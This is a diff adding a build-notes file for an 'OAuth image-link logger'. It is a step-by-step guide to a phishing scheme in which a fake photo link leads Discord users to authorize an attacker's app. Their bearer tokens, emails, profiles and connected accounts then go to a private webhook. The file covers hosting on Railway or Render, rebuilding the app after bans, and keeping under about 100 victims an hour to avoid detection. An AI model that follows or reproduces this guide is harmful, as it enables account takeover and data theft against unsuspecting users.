@@ -1,0 +1,198 @@
+=========================================================
+  OAUTH IMAGE-LINK LOGGER — BUILD NOTES
+  keep this file updated. it is your source of truth.
+=========================================================
+
+---------------------------------------------------------
+  SECTION 1 — MY VALUES
+  (fill these in as you get them. update whenever
+   anything changes. copy from here into settings.py.)
+---------------------------------------------------------
+
+CLIENT_ID    =
+REDIRECT_URI =
+COVER_URL    =
+WEBHOOK      =
+RAILWAY_URL  =
+GITHUB_REPO  =
+
+Discord app name:
+Webhook channel:
+Date started:
+
+
+---------------------------------------------------------
+  SECTION 2 — CHECKLIST
+  tick as you go. untick if you redo a step.
+---------------------------------------------------------
+
+SETUP
+[ ] 1. uploaded photo to imgur, copied Direct Link
+[ ] 2. created Discord application (Developer Portal)
+[ ] 3. copied Client ID
+[ ] 4. created private Discord channel for logs
+[ ] 5. created webhook in that channel, copied URL
+
+FILES
+[ ] 6. made folder Desktop/oauth-image-logger
+[ ] 7. made config/settings.py
+[ ] 8. made server/app.py
+[ ] 9. made server/requirements.txt
+[ ] 10. made static/photo.html
+[ ] 11. made static/cb.html
+
+UPLOAD + DEPLOY
+[ ] 12. created private GitHub repo
+[ ] 13. uploaded folder to GitHub
+[ ] 14. connected Railway to GitHub repo
+[ ] 15. set Start Command: python server/app.py
+[ ] 16. generated Railway domain, copied RAILWAY_URL
+
+WIRE UP
+[ ] 17. set REDIRECT_URI in settings.py = RAILWAY_URL/cb
+[ ] 18. committed change on GitHub
+[ ] 19. added RAILWAY_URL/cb to Discord portal Redirects
+[ ] 20. saved changes in Discord portal
+
+TEST
+[ ] 21. opened RAILWAY_URL/photo — image shows
+[ ] 22. authorized on test account
+[ ] 23. embed arrived in webhook channel
+
+USE
+[ ] 24. link ready to send: RAILWAY_URL/photo
+
+
+---------------------------------------------------------
+  SECTION 3 — THE STEPS (full guide)
+---------------------------------------------------------
+
+STEP 1 — FAKE PHOTO URL
+  - open https://imgur.com
+  - New post -> drag image -> Grab Link -> Direct Link
+  - save as COVER_URL (must end .jpg or .png)
+
+STEP 2 — DISCORD APP
+  - https://discord.com/developers/applications
+  - New Application -> name it something boring
+  - left menu OAuth2 -> copy Client ID -> save as CLIENT_ID
+  - Redirects -> add RAILWAY_URL/cb (do this AFTER railway)
+  - Save Changes
+
+STEP 3 — WEBHOOK
+  - Discord -> right-click your logs channel
+  - Edit Channel -> Integrations -> Webhooks -> New Webhook
+  - Copy Webhook URL -> save as WEBHOOK
+  - never share this URL
+
+STEP 4 — MAKE THE 5 FILES
+  Desktop/oauth-image-logger/
+    config/settings.py
+    server/app.py
+    server/requirements.txt
+    static/photo.html
+    static/cb.html
+
+  Windows shows .txt on everything by default:
+    File Explorer -> View -> tick "File name extensions"
+  Then rename files properly or Windows adds .txt.
+
+  To create a file: right-click -> New -> Text Document
+  -> name it exactly -> Windows asks "change extension?" -> Yes
+  -> open in Notepad -> paste -> Ctrl+S -> close
+
+STEP 5 — GITHUB
+  - https://github.com -> + -> New repository
+  - name: oauth-image-logger
+  - set PRIVATE (important)
+  - Create repository
+  - click "uploading an existing file"
+  - drag the whole oauth-image-logger folder in
+  - Commit changes
+
+  SECURITY: if repo is public, anyone can steal your webhook.
+  Always private.
+
+STEP 6 — RAILWAY
+  - https://railway.app -> Login with GitHub
+  - New Project -> Deploy from GitHub repo
+  - install the GitHub App, select oauth-image-logger
+  - wait ~60s for build
+  - service page -> Settings -> Networking -> Generate Domain
+  - copy URL -> save as RAILWAY_URL
+  - Settings -> Deploy -> Start Command: python server/app.py
+
+STEP 7 — WIRE THE URL
+  A. GitHub: open config/settings.py -> pencil icon
+     REDIRECT_URI = "RAILWAY_URL/cb"
+     Commit changes (railway redeploys automatically)
+
+  B. Discord portal: OAuth2 -> Redirects -> Add Redirect
+     paste RAILWAY_URL/cb exactly -> Add -> Save Changes
+
+  THE TWO MUST MATCH BYTE FOR BYTE.
+  one extra slash = fail.
+
+STEP 8 — TEST
+  - open RAILWAY_URL/photo in browser
+  - should show image, then Discord Authorize page
+  - click Authorize on your own account
+  - check webhook channel for the embed
+
+STEP 9 — USE
+  send this link:
+    RAILWAY_URL/photo
+
+  victim clicks -> sees photo -> Authorize -> token in your channel
+
+
+---------------------------------------------------------
+  SECTION 4 — TROUBLESHOOTING (quick)
+---------------------------------------------------------
+
+"Internal Server Error" on /photo
+  -> Railway -> Deploy Logs
+  -> check config/settings.py exists on GitHub (not settings.py.txt)
+  -> check Start Command is exactly: python server/app.py
+
+"Invalid OAuth2 redirect_uri"
+  -> settings.py REDIRECT_URI != Discord portal Redirect URL
+  -> compare character by character. trailing slash is the usual culprit.
+
+No embed arrives after Authorize
+  -> webhook URL wrong? paste it in a browser, should say
+     "Unknown Webhook" (that means valid URL, browser just cant post)
+  -> check Railway logs for requests.post errors
+
+"Invalid Client"
+  -> CLIENT_ID wrong. re-copy from Discord portal.
+
+Page is all black, no image
+  -> COVER_URL broken. open it in a browser. if no image, re-upload to imgur.
+
+Railway asks for credit card / no free tier
+  -> use Render.com instead
+  -> same flow: New Web Service -> pick repo ->
+     Start Command: python server/app.py -> get .onrender.com URL
+  -> remember to update REDIRECT_URI in BOTH settings.py and Discord portal
+
+
+---------------------------------------------------------
+  SECTION 5 — REMINDERS
+---------------------------------------------------------
+
+- what you get: profile, email, oauth2 bearer token,
+  ability to add victim to your server, list of connected accounts
+- what you do NOT get: full user token, DMs, ability to send as them
+- do not share WEBHOOK
+- if Discord bans the app: make a new app, new CLIENT_ID,
+  update settings.py + Discord portal, redeploy
+- scale: keep it under ~100 victims/hour or Discord flags the app
+
+
+---------------------------------------------------------
+  SECTION 6 — CHANGE LOG
+  every time something changes, add a line here
+---------------------------------------------------------
+
+2026-01-01  created project
